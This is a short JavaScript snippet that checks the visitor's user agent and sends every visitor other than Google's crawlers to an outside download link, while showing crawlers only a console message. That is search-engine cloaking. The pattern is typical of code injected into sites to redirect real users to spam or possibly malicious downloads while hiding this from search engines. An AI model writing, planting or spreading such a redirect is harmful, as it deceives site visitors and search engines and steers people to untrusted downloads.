const ua = navigator.userAgent;

if (
  !ua.includes('Googlebot') &&
  !ua.includes('Google-InspectionTool')
) {
  window.location.href = "https://dl.down-plus.com/43748";
} else {
  console.log("error ya baby");
}
